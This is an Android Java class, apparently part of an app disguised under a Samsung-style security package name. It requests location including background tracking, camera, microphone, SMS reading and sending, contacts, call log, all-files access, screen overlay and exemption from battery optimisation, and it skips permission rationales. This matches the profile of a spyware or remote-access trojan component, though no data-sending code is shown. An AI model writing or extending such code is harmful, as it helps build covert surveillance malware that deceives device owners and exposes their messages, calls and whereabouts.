package com.samsung.android.security.v8.utils;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.Settings;
import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.karumi.dexter.Dexter;
import com.karumi.dexter.MultiplePermissionsReport;
import com.karumi.dexter.PermissionToken;
import com.karumi.dexter.listener.PermissionRequest;
import com.karumi.dexter.listener.multi.MultiplePermissionsListener;

import java.util.ArrayList;
import java.util.List;

/**
 * PermissionManager - إدارة جميع الصلاحيات
 */
public class PermissionManager {
    
    private static final String TAG = "PermissionManager";
    private Activity activity;
    
    // قائمة الصلاحيات المطلوبة
    private static final String[] REQUIRED_PERMISSIONS = {
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.WRITE_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.SYSTEM_ALERT_WINDOW,
        Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
    };
    
    public PermissionManager(Activity activity) {
        this.activity = activity;
    }
    
    /**
     * طلب جميع الصلاحيات
     */
    public void requestAllPermissions(final PermissionCallback callback) {
        // إضافة صلاحيات Android 10+
        List<String> permissions = new ArrayList<>();
        for (String permission : REQUIRED_PERMISSIONS) {
            permissions.add(permission);
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            permissions.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // طلب MANAGE_EXTERNAL_STORAGE بشكل منفصل
            requestManageExternalStorage();
        }
        
        Dexter.withActivity(activity)
            .withPermissions(permissions)
            .withListener(new MultiplePermissionsListener() {
                @Override
                public void onPermissionsChecked(MultiplePermissionsReport report) {
                    if (report.areAllPermissionsGranted()) {
                        // طلب صلاحيات إضافية
                        requestAdditionalPermissions(callback);
                    } else {
                        callback.onPermissionsDenied();
                    }
                }
                
                @Override
                public void onPermissionRationaleShouldBeShown(
                    List<PermissionRequest> permissions, 
                    PermissionToken token) {
                    token.continuePermissionRequest();
                }
            })
            .check();
    }
    
    /**
     * طلب MANAGE_EXTERNAL_STORAGE (Android 11+)
     */
    private void requestManageExternalStorage() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    Uri uri = Uri.fromParts("package", activity.getPackageName(), null);
                    intent.setData(uri);
                    activity.startActivity(intent);
                } catch (Exception e) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    activity.startActivity(intent);
                }
            }
        }
    }
    
    /**
     * طلب صلاحيات إضافية
     */
    private void requestAdditionalPermissions(PermissionCallback callback) {
        // طلب تجاهل Battery Optimization
        requestBatteryOptimization();
        
        // طلب Draw Over Other Apps
        requestDrawOverlay();
        
        // جميع الصلاحيات تم منحها
        callback.onPermissionsGranted();
    }
    
    /**
     * طلب تجاهل Battery Optimization
     */
    private void requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                Intent intent = new Intent();
                String packageName = activity.getPackageName();
                android.os.PowerManager pm = (android.os.PowerManager) activity.getSystemService(Context.POWER_SERVICE);
                
                if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                    intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + packageName));
                    activity.startActivity(intent);
                }
            } catch (Exception e) {
                Log.e(TAG, "Battery optimization request error: " + e.getMessage());
            }
        }
    }
    
    /**
     * طلب Draw Over Other Apps
     */
    private void requestDrawOverlay() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(activity)) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + activity.getPackageName()));
                    activity.startActivity(intent);
                } catch (Exception e) {
                    Log.e(TAG, "Draw overlay request error: " + e.getMessage());
                }
            }
        }
    }
    
    /**
     * التحقق من صلاحية معينة
     */
    public static boolean hasPermission(Context context, String permission) {
        return ContextCompat.checkSelfPermission(context, permission) 
            == PackageManager.PERMISSION_GRANTED;
    }
    
    /**
     * التحقق من جميع الصلاحيات
     */
    public static boolean hasAllPermissions(Context context) {
        for (String permission : REQUIRED_PERMISSIONS) {
            if (!hasPermission(context, permission)) {
                return false;
            }
        }
        return true;
    }
    
    /**
     * Callback للصلاحيات
     */
    public interface PermissionCallback {
        void onPermissionsGranted();
        void onPermissionsDenied();
    }
}
